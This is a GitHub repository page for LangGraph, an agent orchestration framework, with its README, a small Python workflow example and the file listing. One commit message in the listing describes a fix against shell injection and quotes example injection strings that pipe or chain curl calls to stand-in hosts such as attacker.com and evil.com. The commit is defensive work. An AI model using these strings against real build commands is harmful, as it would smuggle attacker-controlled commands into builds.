[Skip to content](https://github.com/langchain-ai/langgraph#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/langchain-ai/langgraph) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/langchain-ai/langgraph) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/langchain-ai/langgraph) to refresh your session.Dismiss alert

{{ message }}

[langchain-ai](https://github.com/langchain-ai)/ **[langgraph](https://github.com/langchain-ai/langgraph)** Public

- [Notifications](https://github.com/login?return_to=%2Flangchain-ai%2Flanggraph) You must be signed in to change notification settings
- [Fork\\
4.5k](https://github.com/login?return_to=%2Flangchain-ai%2Flanggraph)
- [Star\\
26k](https://github.com/login?return_to=%2Flangchain-ai%2Flanggraph)


main

[**234** Branches](https://github.com/langchain-ai/langgraph/branches) [**485** Tags](https://github.com/langchain-ai/langgraph/tags)

[Go to Branches page](https://github.com/langchain-ai/langgraph/branches)[Go to Tags page](https://github.com/langchain-ai/langgraph/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>![jkennedyvz](https://avatars.githubusercontent.com/u/65985482?v=4&size=40)![claude](https://avatars.githubusercontent.com/u/81847?v=4&size=40)<br>[John Kennedy (jkennedyvz)](https://github.com/langchain-ai/langgraph/commits?author=jkennedyvz)<br>and<br>[Claude (claude)](https://github.com/langchain-ai/langgraph/commits?author=claude)<br>[fix(cli): block shell injection chars in build/install commands (](https://github.com/langchain-ai/langgraph/commit/e00a02757964a95a9426a5d953c9adb0ab9d7f63) [#7044](https://github.com/langchain-ai/langgraph/pull/7044) [)](https://github.com/langchain-ai/langgraph/commit/e00a02757964a95a9426a5d953c9adb0ab9d7f63)<br>Open commit detailssuccess<br>3 days agoMar 6, 2026<br>[e00a027](https://github.com/langchain-ai/langgraph/commit/e00a02757964a95a9426a5d953c9adb0ab9d7f63) · 3 days agoMar 6, 2026<br>## History<br>[6,555 Commits](https://github.com/langchain-ai/langgraph/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/langchain-ai/langgraph/commits/main/) 6,555 Commits |
| [.github](https://github.com/langchain-ai/langgraph/tree/main/.github ".github") | [.github](https://github.com/langchain-ai/langgraph/tree/main/.github ".github") | [chore: new logos (](https://github.com/langchain-ai/langgraph/commit/0fe365ec4c423231c37f9ed147669abd249bfa2e "chore: new logos (#7002)") [#7002](https://github.com/langchain-ai/langgraph/pull/7002) [)](https://github.com/langchain-ai/langgraph/commit/0fe365ec4c423231c37f9ed147669abd249bfa2e "chore: new logos (#7002)") | last weekMar 2, 2026 |
| [docs](https://github.com/langchain-ai/langgraph/tree/main/docs "docs") | [docs](https://github.com/langchain-ai/langgraph/tree/main/docs "docs") | [chore(docs): Add new redirects file(s) so we can update/add (](https://github.com/langchain-ai/langgraph/commit/c4f58611660543bf9341232eb971551654dcf5d0 "chore(docs): Add new redirects file(s) so we can update/add (#6778)  Adds redirects for all old LangGraph docs URLs to docs.langchain.com using meta refresh and GitHub Pages") [#6778](https://github.com/langchain-ai/langgraph/pull/6778) [)](https://github.com/langchain-ai/langgraph/commit/c4f58611660543bf9341232eb971551654dcf5d0 "chore(docs): Add new redirects file(s) so we can update/add (#6778)  Adds redirects for all old LangGraph docs URLs to docs.langchain.com using meta refresh and GitHub Pages") | 3 weeks agoFeb 18, 2026 |
| [examples](https://github.com/langchain-ai/langgraph/tree/main/examples "examples") | [examples](https://github.com/langchain-ai/langgraph/tree/main/examples "examples") | [docs: update notebook links and add archival notices for examples (](https://github.com/langchain-ai/langgraph/commit/fbcb8a911b626b4373fd4aff9624124e9532987f "docs: update notebook links and add archival notices for examples (#6720)  Addresses some comments in #6682  - Update links in notebooks to point to the new documentation location. - Add archival notices indicating that the examples are no longer updated. - Remove some obsolete notebooks that have been moved to the new documentation.  Please comment here if you encounter any issues") [#6720](https://github.com/langchain-ai/langgraph/pull/6720) | 2 months agoJan 26, 2026 |
| [libs](https://github.com/langchain-ai/langgraph/tree/main/libs "libs") | [libs](https://github.com/langchain-ai/langgraph/tree/main/libs "libs") | [fix(cli): block shell injection chars in build/install commands (](https://github.com/langchain-ai/langgraph/commit/e00a02757964a95a9426a5d953c9adb0ab9d7f63 "fix(cli): block shell injection chars in build/install commands (#7044)  ## Summary - Adds `|`, `;`, `$`, `>`, `<`, `\t` to `DISALLOWED_BUILD_COMMAND_CHARS` to prevent command injection in CLI `build_command` / `install_command` parameters - Previously these values were interpolated directly into Dockerfile `RUN` directives with no validation - Single `&` is blocked (background execution) while `&&` remains allowed since it's commonly used in build commands (e.g. `npm install && npm build`) - Adds `has_disallowed_build_command_content()` validation function and applies it in the `build` CLI command - Mirrors langchain-ai/langchainplus#19143  **Attack examples now blocked:** - `pip install foo | curl attacker.com` (pipe) - `npm install; curl evil.com` (semicolon) - `pip install $(whoami)` (command substitution) - `pip install ${IFS}evil` (variable expansion) - `npm install & curl evil.com` (background execution)  ## Test Plan - [x] 27 new unit tests covering all disallowed chars, injection patterns, single `&` rejection, `&&` allowance, and valid commands - [x] All 64 tests in `test_config.py` pass (37 existing + 27 new)  🤖 Generated with [Claude Code](https://claude.com/claude-code)  ---------  Co-authored-by: Claude Opus 4.6 <noreply@anthropic.com>") [#7044](https://github.com/langchain-ai/langgraph/pull/7044) [)](https://github.com/langchain-ai/langgraph/commit/e00a02757964a95a9426a5d953c9adb0ab9d7f63 "fix(cli): block shell injection chars in build/install commands (#7044)  ## Summary - Adds `|`, `;`, `$`, `>`, `<`, `\t` to `DISALLOWED_BUILD_COMMAND_CHARS` to prevent command injection in CLI `build_command` / `install_command` parameters - Previously these values were interpolated directly into Dockerfile `RUN` directives with no validation - Single `&` is blocked (background execution) while `&&` remains allowed since it's commonly used in build commands (e.g. `npm install && npm build`) - Adds `has_disallowed_build_command_content()` validation function and applies it in the `build` CLI command - Mirrors langchain-ai/langchainplus#19143  **Attack examples now blocked:** - `pip install foo | curl attacker.com` (pipe) - `npm install; curl evil.com` (semicolon) - `pip install $(whoami)` (command substitution) - `pip install ${IFS}evil` (variable expansion) - `npm install & curl evil.com` (background execution)  ## Test Plan - [x] 27 new unit tests covering all disallowed chars, injection patterns, single `&` rejection, `&&` allowance, and valid commands - [x] All 64 tests in `test_config.py` pass (37 existing + 27 new)  🤖 Generated with [Claude Code](https://claude.com/claude-code)  ---------  Co-authored-by: Claude Opus 4.6 <noreply@anthropic.com>") | 3 days agoMar 6, 2026 |
| [.gitignore](https://github.com/langchain-ai/langgraph/blob/main/.gitignore ".gitignore") | [.gitignore](https://github.com/langchain-ai/langgraph/blob/main/.gitignore ".gitignore") | [chore: more cleanup (](https://github.com/langchain-ai/langgraph/commit/d066a321bc5a6ca08c2532873a2759cdce1c4d0a "chore: more cleanup (#6667)") [#6667](https://github.com/langchain-ai/langgraph/pull/6667) [)](https://github.com/langchain-ai/langgraph/commit/d066a321bc5a6ca08c2532873a2759cdce1c4d0a "chore: more cleanup (#6667)") | 2 months agoJan 9, 2026 |
| [AGENTS.md](https://github.com/langchain-ai/langgraph/blob/main/AGENTS.md "AGENTS.md") | [AGENTS.md](https://github.com/langchain-ai/langgraph/blob/main/AGENTS.md "AGENTS.md") | [chore(infra): update `AGENTS.md` for inline code formatting guidelines (](https://github.com/langchain-ai/langgraph/commit/f688b068e7f06111fc69ee70adc1b66c75fa5a93 "chore(infra): update `AGENTS.md` for inline code formatting guidelines (#6752)") | last monthFeb 5, 2026 |
| [CLAUDE.md](https://github.com/langchain-ai/langgraph/blob/main/CLAUDE.md "CLAUDE.md") | [CLAUDE.md](https://github.com/langchain-ai/langgraph/blob/main/CLAUDE.md "CLAUDE.md") | [chore(infra): update `AGENTS.md` for inline code formatting guidelines (](https://github.com/langchain-ai/langgraph/commit/f688b068e7f06111fc69ee70adc1b66c75fa5a93 "chore(infra): update `AGENTS.md` for inline code formatting guidelines (#6752)") | last monthFeb 5, 2026 |
| [LICENSE](https://github.com/langchain-ai/langgraph/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/langchain-ai/langgraph/blob/main/LICENSE "LICENSE") | [libs: add cli, sdk-py, sdk-js and move core langgraph](https://github.com/langchain-ai/langgraph/commit/1a06d500d4282cfdb2ae9d7748bb570e8162acdf "libs: add cli, sdk-py, sdk-js and move core langgraph") | 2 years agoJun 17, 2024 |
| [Makefile](https://github.com/langchain-ai/langgraph/blob/main/Makefile "Makefile") | [Makefile](https://github.com/langchain-ai/langgraph/blob/main/Makefile "Makefile") | [ci: add automated](https://github.com/langchain-ai/langgraph/commit/b3708bd7f66675f7a04bf9950c33d495c49cd843 "ci: add automated `uv lock --upgrade` workflow (#5307)")`uv lock --upgrade` [workflow (](https://github.com/langchain-ai/langgraph/commit/b3708bd7f66675f7a04bf9950c33d495c49cd843 "ci: add automated `uv lock --upgrade` workflow (#5307)") [#5307](https://github.com/langchain-ai/langgraph/pull/5307) [)](https://github.com/langchain-ai/langgraph/commit/b3708bd7f66675f7a04bf9950c33d495c49cd843 "ci: add automated `uv lock --upgrade` workflow (#5307)") | 9 months agoJul 2, 2025 |
| [README.md](https://github.com/langchain-ai/langgraph/blob/main/README.md "README.md") | [README.md](https://github.com/langchain-ai/langgraph/blob/main/README.md "README.md") | [Change logo width in README.md](https://github.com/langchain-ai/langgraph/commit/c1e62bad8a516794fd97773a6bb06331ca65e031 "Change logo width in README.md  Updated logo image width in README.md from 80% to 50%.") | last weekMar 2, 2026 |
| View all files |

## Repository files navigation

![LangGraph Logo](https://github.com/langchain-ai/langgraph/raw/main/.github/images/logo-dark.svg)

[![Version](https://camo.githubusercontent.com/28715b4724dc05f3ffb3a0cda4069876d0e8ada606267c944bc83639b3ebe5ff/68747470733a2f2f696d672e736869656c64732e696f2f707970692f762f6c616e6767726170682e737667)](https://pypi.org/project/langgraph/)[![Downloads](https://camo.githubusercontent.com/81ef74dbbdd86537708ac52c5757df06b12129ea96d7aa92254c8276fee2b3fa/68747470733a2f2f7374617469632e706570792e746563682f62616467652f6c616e6767726170682f6d6f6e7468)](https://pepy.tech/project/langgraph)[![Open Issues](https://camo.githubusercontent.com/bcb848d635a6a73f5c1c2be97875ac1369539d5a025be181e6d1f6125933b2d1/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6973737565732d7261772f6c616e67636861696e2d61692f6c616e676772617068)](https://github.com/langchain-ai/langgraph/issues)[![Docs](https://camo.githubusercontent.com/b98c4ce4549448d09f2217965c7d6f2cf39ee6800b2b4c63dfd62080fb5533d8/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f646f63732d6c61746573742d626c7565)](https://docs.langchain.com/oss/python/langgraph/overview)

Trusted by companies shaping the future of agents – including Klarna, Replit, Elastic, and more – LangGraph is a low-level orchestration framework for building, managing, and deploying long-running, stateful agents.

## Get started

[Permalink: Get started](https://github.com/langchain-ai/langgraph#get-started)

Install LangGraph:

```
pip install -U langgraph
```

Create a simple workflow:

```
from langgraph.graph import START, StateGraph
from typing_extensions import TypedDict

class State(TypedDict):
    text: str

def node_a(state: State) -> dict:
    return {"text": state["text"] + "a"}

def node_b(state: State) -> dict:
    return {"text": state["text"] + "b"}

graph = StateGraph(State)
graph.add_node("node_a", node_a)
graph.add_node("node_b", node_b)
graph.add_edge(START, "node_a")
graph.add_edge("node_a", "node_b")

print(graph.compile().invoke({"text": ""}))
# {'text': 'ab'}
```

Get started with the [LangGraph Quickstart](https://docs.langchain.com/oss/python/langgraph/quickstart).

To quickly build agents with LangChain's `create_agent` (built on LangGraph), see the [LangChain Agents documentation](https://docs.langchain.com/oss/python/langchain/agents).

Tip

For developing, debugging, and deploying AI agents and LLM applications, see [LangSmith](https://docs.langchain.com/langsmith/home).

## Core benefits

[Permalink: Core benefits](https://github.com/langchain-ai/langgraph#core-benefits)

LangGraph provides low-level supporting infrastructure for _any_ long-running, stateful workflow or agent. LangGraph does not abstract prompts or architecture, and provides the following central benefits:

- [Durable execution](https://docs.langchain.com/oss/python/langgraph/durable-execution): Build agents that persist through failures and can run for extended periods, automatically resuming from exactly where they left off.
- [Human-in-the-loop](https://docs.langchain.com/oss/python/langgraph/interrupts): Seamlessly incorporate human oversight by inspecting and modifying agent state at any point during execution.
- [Comprehensive memory](https://docs.langchain.com/oss/python/langgraph/memory): Create truly stateful agents with both short-term working memory for ongoing reasoning and long-term persistent memory across sessions.
- [Debugging with LangSmith](http://www.langchain.com/langsmith): Gain deep visibility into complex agent behavior with visualization tools that trace execution paths, capture state transitions, and provide detailed runtime metrics.
- [Production-ready deployment](https://docs.langchain.com/langsmith/app-development): Deploy sophisticated agent systems confidently with scalable infrastructure designed to handle the unique challenges of stateful, long-running workflows.

## LangGraph’s ecosystem

[Permalink: LangGraph’s ecosystem](https://github.com/langchain-ai/langgraph#langgraphs-ecosystem)

While LangGraph can be used standalone, it also integrates seamlessly with any LangChain product, giving developers a full suite of tools for building agents. To improve your LLM application development, pair LangGraph with:

- [LangSmith](http://www.langchain.com/langsmith) — Helpful for agent evals and observability. Debug poor-performing LLM app runs, evaluate agent trajectories, gain visibility in production, and improve performance over time.
- [LangSmith Deployment](https://docs.langchain.com/langsmith/deployments) — Deploy and scale agents effortlessly with a purpose-built deployment platform for long running, stateful workflows. Discover, reuse, configure, and share agents across teams — and iterate quickly with visual prototyping in [LangGraph Studio](https://docs.langchain.com/oss/python/langgraph/studio).
- [LangChain](https://docs.langchain.com/oss/python/langchain/overview) – Provides integrations and composable components to streamline LLM application development.

Note

Looking for the JS version of LangGraph? See the [JS repo](https://github.com/langchain-ai/langgraphjs) and the [JS docs](https://docs.langchain.com/oss/javascript/langgraph/overview).

## Additional resources

[Permalink: Additional resources](https://github.com/langchain-ai/langgraph#additional-resources)

- [Guides](https://docs.langchain.com/oss/python/langgraph/overview): Quick, actionable code snippets for topics such as streaming, adding memory & persistence, and design patterns (e.g. branching, subgraphs, etc.).
- [Reference](https://reference.langchain.com/python/langgraph/): Detailed reference on core classes, methods, how to use the graph and checkpointing APIs, and higher-level prebuilt components.
- [Examples](https://docs.langchain.com/oss/python/langgraph/agentic-rag): Guided examples on getting started with LangGraph.
- [LangChain Forum](https://forum.langchain.com/): Connect with the community and share all of your technical questions, ideas, and feedback.
- [LangChain Academy](https://academy.langchain.com/courses/intro-to-langgraph): Learn the basics of LangGraph in our free, structured course.
- [Case studies](https://www.langchain.com/built-with-langgraph): Hear how industry leaders use LangGraph to ship AI applications at scale.

## Acknowledgements

[Permalink: Acknowledgements](https://github.com/langchain-ai/langgraph#acknowledgements)

LangGraph is inspired by [Pregel](https://research.google/pubs/pub37252/) and [Apache Beam](https://beam.apache.org/). The public interface draws inspiration from [NetworkX](https://networkx.org/documentation/latest/). LangGraph is built by LangChain Inc, the creators of LangChain, but can be used without LangChain.

## About

Build resilient language agents as graphs.


[docs.langchain.com/oss/python/langgraph/](https://docs.langchain.com/oss/python/langgraph/ "https://docs.langchain.com/oss/python/langgraph/")

### Topics

[python](https://github.com/topics/python "Topic: python") [open-source](https://github.com/topics/open-source "Topic: open-source") [enterprise](https://github.com/topics/enterprise "Topic: enterprise") [framework](https://github.com/topics/framework "Topic: framework") [ai](https://github.com/topics/ai "Topic: ai") [gemini](https://github.com/topics/gemini "Topic: gemini") [openai](https://github.com/topics/openai "Topic: openai") [multiagent](https://github.com/topics/multiagent "Topic: multiagent") [agents](https://github.com/topics/agents "Topic: agents") [ai-agents](https://github.com/topics/ai-agents "Topic: ai-agents") [rag](https://github.com/topics/rag "Topic: rag") [pydantic](https://github.com/topics/pydantic "Topic: pydantic") [llm](https://github.com/topics/llm "Topic: llm") [generative-ai](https://github.com/topics/generative-ai "Topic: generative-ai") [chatgpt](https://github.com/topics/chatgpt "Topic: chatgpt") [langchain](https://github.com/topics/langchain "Topic: langchain") [langgraph](https://github.com/topics/langgraph "Topic: langgraph") [deepagents](https://github.com/topics/deepagents "Topic: deepagents")

### Resources

[Readme](https://github.com/langchain-ai/langgraph#readme-ov-file)

### License

[MIT license](https://github.com/langchain-ai/langgraph#MIT-1-ov-file)

### Code of conduct

[Code of conduct](https://github.com/langchain-ai/langgraph#coc-ov-file)

### Contributing

[Contributing](https://github.com/langchain-ai/langgraph#contributing-ov-file)

### Security policy

[Security policy](https://github.com/langchain-ai/langgraph#security-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/langchain-ai/langgraph).

[Activity](https://github.com/langchain-ai/langgraph/activity)

[Custom properties](https://github.com/langchain-ai/langgraph/custom-properties)

### Stars

[**26k**\\
stars](https://github.com/langchain-ai/langgraph/stargazers)

### Watchers

[**143**\\
watching](https://github.com/langchain-ai/langgraph/watchers)

### Forks

[**4.5k**\\
forks](https://github.com/langchain-ai/langgraph/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Flangchain-ai%2Flanggraph&report=langchain-ai+%28user%29)

## [Releases\  474](https://github.com/langchain-ai/langgraph/releases)

[langgraph-cli==0.4.14\\
Latest\\
\\
last weekMar 2, 2026](https://github.com/langchain-ai/langgraph/releases/tag/cli%3D%3D0.4.14)

[\+ 473 releases](https://github.com/langchain-ai/langgraph/releases)

## [Used by 36.6k](https://github.com/langchain-ai/langgraph/network/dependents)

[- ![@elonwoo-02](https://avatars.githubusercontent.com/u/86370026?s=64&v=4)\\
- ![@ZholamanKuangaliyev](https://avatars.githubusercontent.com/u/112862577?s=64&v=4)\\
- ![@b4thestorm](https://avatars.githubusercontent.com/u/4723872?s=64&v=4)\\
- ![@Hyperkit-Labs](https://avatars.githubusercontent.com/u/249081322?s=64&v=4)\\
- ![@KSVKORD](https://avatars.githubusercontent.com/u/96335088?s=64&v=4)\\
- ![@haimingyue](https://avatars.githubusercontent.com/u/33080895?s=64&v=4)\\
- ![@fakhrijongkeng](https://avatars.githubusercontent.com/u/186386629?s=64&v=4)\\
- ![@swxs](https://avatars.githubusercontent.com/u/18203761?s=64&v=4)\\
\\
\+ 36,593](https://github.com/langchain-ai/langgraph/network/dependents)

## [Contributors\  287](https://github.com/langchain-ai/langgraph/graphs/contributors)

- [![@nfcampos](https://avatars.githubusercontent.com/u/56902?s=64&v=4)](https://github.com/nfcampos)
- [![@hinthornw](https://avatars.githubusercontent.com/u/13333726?s=64&v=4)](https://github.com/hinthornw)
- [![@dqbd](https://avatars.githubusercontent.com/u/1443449?s=64&v=4)](https://github.com/dqbd)
- [![@eyurtsev](https://avatars.githubusercontent.com/u/3205522?s=64&v=4)](https://github.com/eyurtsev)
- [![@sydney-runkle](https://avatars.githubusercontent.com/u/54324534?s=64&v=4)](https://github.com/sydney-runkle)
- [![@andrewnguonly](https://avatars.githubusercontent.com/u/7654246?s=64&v=4)](https://github.com/andrewnguonly)
- [![@hwchase17](https://avatars.githubusercontent.com/u/11986836?s=64&v=4)](https://github.com/hwchase17)
- [![@isahers1](https://avatars.githubusercontent.com/u/78627776?s=64&v=4)](https://github.com/isahers1)
- [![@lnhsingh](https://avatars.githubusercontent.com/u/15386648?s=64&v=4)](https://github.com/lnhsingh)
- [![@rlancemartin](https://avatars.githubusercontent.com/u/122662504?s=64&v=4)](https://github.com/rlancemartin)
- [![@ccurme](https://avatars.githubusercontent.com/u/26529506?s=64&v=4)](https://github.com/ccurme)
- [![@dependabot[bot]](https://avatars.githubusercontent.com/in/29110?s=64&v=4)](https://github.com/apps/dependabot)
- [![@bracesproul](https://avatars.githubusercontent.com/u/46789226?s=64&v=4)](https://github.com/bracesproul)
- [![@lc-arjun](https://avatars.githubusercontent.com/u/185099244?s=64&v=4)](https://github.com/lc-arjun)

[\+ 273 contributors](https://github.com/langchain-ai/langgraph/graphs/contributors)

## Languages

- [Python99.3%](https://github.com/langchain-ai/langgraph/search?l=python)
- Other0.7%

You can’t perform that action at this time.